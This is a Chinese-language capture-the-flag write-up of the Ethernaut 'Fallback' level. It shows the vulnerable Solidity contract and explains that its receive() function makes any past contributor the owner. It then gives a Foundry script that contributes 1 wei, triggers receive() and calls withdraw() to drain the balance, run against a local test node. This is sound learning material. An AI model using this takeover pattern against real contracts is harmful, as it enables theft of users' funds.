# Fallback 

## **Fallback**

### 合约

目标：

* 获得合约所有权，即成为owner
* 把余额减到0

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

//0x0f2f2D560dC658A0DF923516dDb268058e003dbd
//0x5FbDB2315678afecb367f032d93F642f64180aa3(本地的合约地址)

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;


    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable { //view pure
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
 
}
```

* `contribute()`：每次捐赠限制为小于 0.001 ETH，且如果捐赠者的贡献超过 `owner`，会更新 `owner` 为捐赠者。
* `receive()`：当合约接收到一笔\*\*普通转账（没有调用函数）\*\*时，如果 `msg.sender` 曾经调用过 `contribute()`（即贡献过任意金额），那么会直接把 `owner` 设置为 `msg.sender`

**<font style="background-color:#f3bb2f;">可知，两个函数都能改变owner，但</font>**`contrubute`**<font style="background-color:#f3bb2f;">的条件太难，居然在每次贡献不超0.001ETH的限制下要达到1000ETH，显然走不通，所以走</font>**`receive`**<font style="background-color:#f3bb2f;">这条路，相对来说更容易实现</font>**

* `withdraw()`：只有 `owner` 可以提取合约中的 ETH。

### 攻击思路

1. \*\*调用 `contribute()` ：\*\*捐赠一点 ETH（如 0.0001 ether）

<font style="background-color:#f3bb2f;">receive() 里的逻辑 </font>**<font style="background-color:#f3bb2f;">只有你是贡献者</font>**<font style="background-color:#f3bb2f;"> 的时候才会考虑把你设为 owner，所以需要先 contribute()</font>

```
- **条件**： `< 0.001 ether`
- 目的是**成为贡献者，满足 **`receive()`** 的触发条件**。
```

2\. **再直接给合约地址转账，触发 **`receive()`**：**
\- **触发条件**：`msg.value > 0`,意思就是只要转了就行，没有指标
3\. **获得 owner 权限后，调用 **`withdraw()`** 提现合约余额，通关**

### 写的脚本

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";//导入forge提供的script工具库和console调试打印
import {Fallback} from "../src/Fallback.sol";//导入目标合约 Fallback

contract FallbackScript is Script {
    function run() external{
    
        vm.startBroadcast();//开始广播,把接下来的调用广播到链上

        Fallback iroha = /Fallback(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3));//指定合约地址
        //iroha是创建的合约实例,注意不能用fallback作为实例名
        

        iroha.contribute{value: 1 wei}();//调用contribute(),贡献一点ETH

        (bool success, ) = address(iroha).call{value: 1 wei}(""); // 发一笔空 data的ETH,触发receive()
        require(success, "Receive call failed");// // 如果失败，脚本报错退出
        
         iroha.withdraw();//成为owner了,可以调用withdraw(),提取余额

        vm.stopBroadcast();//停止广播

    }
}

```

终端输入

```solidity
forge script script/Fallback.sol --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e3。。。（私钥） --broadcast
```

回车,脚本运行成功

![](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20250413114540894.png)


> 更新: 2025-07-09 11:27:33  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/pgx83kkfeq6fztgt>